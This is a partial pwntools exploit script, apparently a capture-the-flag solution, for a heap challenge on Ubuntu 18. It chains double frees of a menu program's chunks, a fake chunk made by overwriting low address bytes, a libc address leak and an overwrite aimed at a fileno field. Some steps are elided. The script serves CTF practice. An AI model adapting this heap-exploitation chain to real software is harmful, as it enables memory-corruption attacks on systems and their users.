...
# ubuntu18
bool_flag = 1
def allocate(ty:int, num:int):
    global io, bool_flag
    assert ty == 1 or ty == 2, 'error!'
    num = int(num)
    ...
    bool_flag = 1
    io.recvuntil("add success !\n")


def delete(ty:int):
    global io, bool_flag
    assert bool_flag == 1, 'error!'
    assert ty == 1 or ty == 2, 'error!'
    io.sendlineafter("which command?\n> ", b'2')
    io.sendlineafter("TYPE:\n1: int\n2: short int\n>", str(ty))
    io.recvuntil("remove success !\n")
    bool_flag = 0
...
def show(ty:int) -> int:
    ...
    leak_msg = msg[msg.index(b':') + 1: -1]
    leak_msg = int(leak_msg.decode())
    if ty == 1:
        leak_msg = (leak_msg & 0xffffffff)
    else:
        leak_msg = (leak_msg & 0xffff)
    log.success('return leak_msg:{}'.format(hex(leak_msg)))
    return leak_msg


allocate(1, 0x10) # int
delete(1)
allocate(2, 0x10) # short
delete(1)
allocate(2, 0x10)
delete(1)
allocate(2, 0x10)
...
# 只需要改低字节
fake_chunk_low_addr = low_addr - 0x10
...
allocate(2, (fake_chunk_low_addr & 0xffff))
allocate(2, 0x91)
allocate(2, 0x91)
...
libc_low_addr = show(1)
file_no_addr = libc_low_addr - 0x2a0 + 0x70
LOG_ADDR('file_no_addr', file_no_addr)

allocate(2, 0x10)
delete(2)
allocate(1, file_no_addr)
delete(2)
allocate(1, file_no_addr)
delete(2)

allocate(2, low_addr + 8)

allocate(2, file_no_addr)
